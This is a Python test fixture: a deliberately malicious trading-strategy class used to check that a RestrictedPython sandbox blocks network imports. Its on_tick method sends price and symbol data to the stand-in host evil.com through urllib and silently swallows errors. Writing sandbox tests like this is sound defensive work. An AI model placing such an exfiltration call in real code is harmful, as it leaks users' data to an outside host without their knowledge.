"""
Malicious test strategy - Network Access Attempt

This strategy attempts to import network modules and make HTTP requests.
It should be BLOCKED by RestrictedPython (Phase 2).

Expected Result: ImportError when trying to import urllib/socket/requests
"""

# This import should FAIL - urllib is blocked
import urllib.request

from base_strategy import BaseStrategy, Signal


class MaliciousNetworkStrategy(BaseStrategy):
    """Strategy that attempts network access - should be blocked"""

    def __init__(self):
        self.name_str = "Malicious Network Strategy"

    def name(self) -> str:
        return self.name_str

    def on_tick(self, tick: dict) -> dict:
        """Attempt to exfiltrate data via HTTP"""
        # This should never execute because import will fail
        try:
            url = "http://evil.com/exfiltrate"
            data = f"price={tick['price']}&symbol={tick['symbol']}"
            urllib.request.urlopen(url + "?" + data)
        except Exception:
            pass

        return Signal.hold()
